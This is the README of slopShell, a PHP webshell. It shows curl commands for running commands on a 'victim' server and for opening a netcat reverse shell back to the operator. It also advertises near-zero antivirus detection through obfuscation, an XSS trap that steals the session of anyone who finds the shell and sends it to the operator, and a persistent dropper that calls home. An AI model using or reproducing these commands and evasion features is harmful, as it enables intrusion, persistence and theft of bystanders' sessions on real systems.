[![GitHub forks](https://img.shields.io/github/forks/oldkingcone/slopShell?style=plastic)](https://github.com/oldkingcone/slopShell/network)
[![GitHub stars](https://img.shields.io/github/stars/oldkingcone/slopShell?style=plastic)](https://github.com/oldkingcone/slopShell/stargazers)
[![GitHub watchers](https://img.shields.io/github/watchers/oldkingcone/slopShell?style=plastic)](https://github.com/oldkingcone/slopShell/watchers)
[![GitHub issues](https://img.shields.io/github/issues/oldkingcone/slopShell?style=plastic)](https://github.com/oldkingcone/slopShell/issues)
[![language](https://img.shields.io/badge/language-PHP-blue?style=plastic)](https://www.php.net)
[![language](https://img.shields.io/badge/language-Powershell-blue?style=plastic)](https://docs.microsoft.com/en-us/powershell/)
[![language](https://img.shields.io/badge/language-Bash-yellow?style=plastic)](https://www.gnu.org/software/bash/)
[![BuyMeACoffee](https://img.shields.io/badge/BuyMeACoffee-Or%20Book-yellowgreen?style=plastic)](https://www.buymeacoffee.com/oldkingcone)


# slopShell
php webshell

Since I derped, and forgot to talk about usage. Here goes.

For this shell to work, you need 2 things, a victim that allows php file upload(yourself, in an educational environment) and a way to send http requests to this webshell. 


Thank you for all the support the community has given, it means alot to us. Now for things that will be added to this shell, to make it even more awesome. 

 - Mutual TLS, with the ability to generate a CA on the fly(if thats possible) 
 - More refined dropper/shell itself, to ensure that the shell will not be stumbled upon for prolonged access.

Basic Usage Video(Hosted on Youtube):

[![Video Showing Usage](https://i.ytimg.com/vi_webp/FywNszpfDJo/maxresdefault.webp)](https://www.youtube.com/watch?v=FywNszpfDJo)

Current VT Detection ratio: 2/59 (most new version)

[![Virus Total](https://www.virustotal.com/gui/images/VT_search_hash.svg)](https://www.virustotal.com/gui/file/fbec31525f79578305d67847183dbef7c7a64b431aef81fd59aadfbaa10461c5/detection)


Current VT Detection ratio (obfuscated version): 0/59 (should be final version of the obfuscated version. Might make more changes to the routine later on, but for now, behold.)

[![Virus Total](https://www.virustotal.com/gui/images/VT_search_hash.svg)](https://www.virustotal.com/gui/file/3f1c5bc158c57d1d065b02760cf7c67d271641176bfad9051e183446b328435d/detection)

~~__The issue with this detection happening is i have not found a viable workaround for the keyword of eval if there was no call to eval this script would be undetectable.__~~

---
# Setup

Ok, so here we go folks, there was an itch I had to write something in PHP so this is it. This webshell has a few bells and whistles, and more are added everyday. You will need a pgsql server running that you control. However you implement that is on you.

Debian: `apt install -y postgresql php php-pear && python -m pip install proxybroker --user`

RHEL Systems: `dnf -y -b install postgresql-server postgresql php php-pear && python -m pip install proxybroker --user`

WIN: `install the php msi, and make sure you have an active postgresql server that you can connect to running somewhere. figure it out.`


Once you have these set up properly and can confirm that they are running. A command I would encourge using is with `pg_ctl` you can create the DB that way, or at least init it and start it. Then all the db queries will work fine.

---
## How to interact.


CLIFFNOTE: For the anti analysis routines, I(oldkingcone) would love to try and take credit for this idea, but I cannot in good conscience, so the inspiration came from 1 person(you know who you are, you evil genius.) whom pointed me to this repo: https://github.com/NullArray/Archivist/blob/master/logger.py#L123 
Firstly, you need to choose a valid User-Agent to use, this is kind of like a first layer of protection against your webshell being accidentally stumbled upon by anyone but you. I went with sp/1.1 as its a non typical user-agent used. This can cause red flags in a pentest, and your access or script to be blocked or deleted. So, be smart about it. Code obfuscation wouldnt hurt, I did not add that in because thats on you to decide. To use the shell, there are some presets to aid you in your pen test and traversal of the machine. I did not add much for windows, because I do not like developing for windows. If you have routines or tricks added or know about, feel free to submit an issue with your suggestion and ill add it. An example of how to use this webshell with curl:

`curl https://victim/slop.php?qs=cqP -H "User-Agent: sp/1.1" -v`

or to execute custom commands:

`curl https://victim/slop.php --data "commander=id" -H "User-Agent: sp/1.1" -v`

Or to attempt to establish a reverse shell to your machine:

`curl https://victim/slop.php --data "rcom=1&mthd=nc&rhost=&rport=&shell=sh" -H "User-Agent: sp/1.1" -v`

- mthd = the method you want to use to establish the reverse shell, this is predefined in the `$comma` array, feel free to add to it, optional, if it is null, the script will choose for you.
- rhost = you, now this and the rport are not required, as it defaults to using netcat with the ip address in the `$_SERVER["REMOTE_ADDR"]` php env variable.
- rport = your listener port, the default was set to 1634, just because.
- shell = the type of system shell you want to have. I know bash isnt standard on all systems, but thats why its nice for you to do some system recon before you try to execute this command.

Here is the better part of this shell. If someone happens upon this shell without supplying the exact user agent string specified in the script, this shell will produce a 500 error with a fake error page then it will attempt some XSS to steal that users session information and sends it back to a handler script on your server/system. This will then attempt to store the information in a running log file. If it is unable to do so, well the backup is your logs. Once the XSS has completed, this shell will redirect the user back to the root(/) of the webserver. So, youll steal sessions if someone finds this, can even beef it up to execute commands on the server on behalf of the user, or drop a reverse shell on the users browser through Beef or another method. The possibilities are legit endless.

---
## Images of use cases

In browser, navigated to without the proper user-agent string. (1st level of auth)
![](https://github.com/oldkingcone/slopShell/tree/master/images/in_browser.jpeg?raw=true)

Use in the terminal, which is how this was designed to work, using curl with the -vH "User-Agent: sp1.1" switches.
![](https://github.com/oldkingcone/slopShell/tree/master/images/use_in_terminal.jpeg?raw=true)

Obfuscated script example: 
![](https://github.com/oldkingcone/slopShell/blob/master/images/obfuscated_script.png?raw=true)

Generation 2 obfuscated script:
![](https://github.com/oldkingcone/slopShell/blob/master/images/obfuscated_gen2.png?raw=true)

Client script usage:
![](https://github.com/oldkingcone/slopShell/blob/master/images/client_usage.png?raw=true)

Reverse Connection initiated from the client script:
![](https://github.com/oldkingcone/slopShell/blob/master/images/reverse_connection_client_script.png?raw=true)


---

## Interacting through the client script

Once the client script is complete, you as the operator will not need to interact though curl to utilize this shell. There will be a client script that you can use to execute all commands/control over. In addition to this client script, there is a dropper. This dropper will ensure the script is run at start up even if the website is removed. Including some call home functions, obfuscation if it is requested on a level from 1 to 3, with 3 being the highest as every function will be rot ciphered and then encoded in base64 within the whole file being base64 encoded with a random name assigned to the file itself. This can help avoid signature detection. 


---
## Encryption

Once the encryption routine is fully worked out, the dropper script will be encrypted, and highly obfuscated.
Example output:
```
Base64 decoded: also a test 123
Re-Encoded: YWxzbyBhIHRlc3QgMTIz
Key: 4212bd1ff1d366f23ca77021706a9a29cb824b45f82ae312bcf220de68c76760289f1d5550aa341002f1cfa9831e871e
Key Length: 96
Encryption Result:
Array
(
    [original] => also a test 123
    [key] => 4212bd1ff1d366f23ca77021706a9a29cb824b45f82ae312bcf220de68c76760289f1d5550aa341002f1cfa9831e871e
    [encrypted] => meIHs/y6_U7U~7(M
    [base64_Encoded] => bWVJSAAdcw4veTZfVQU3VX43KE0=
)
Decrypt Test:
Array
(
    [key] => 4212bd1ff1d366f23ca77021706a9a29cb824b45f82ae312bcf220de68c76760289f1d5550aa341002f1cfa9831e871e
    [encrypted] => meIHs/y6_U7U~7(M
    [decrypted] => YWxzbyBhIHRlc3QgMTIz
    [base64_decoded] => also a test 123
    [original] => also a test 123
)
```

---
## Additional

This was going to remain private. But I decided otherwise.

Do not abuse this shell, and get a signature attached to it, this is quite stealthy right now since its brand new.

I as the maintainer, am in no way responsible for the misuse of this product. This was published for legitmate penetration testing/red teaming purposes, and/or for educational value.  Know the applicable laws in your country of residence before using this script, and do not break the law whilst using this. Thank you and have a nice day.



If you have enjoyed this script, its is obligatory that you follow me and throw a star on this repo... because future editions will have more features(or bugs) depending on how you look at it.

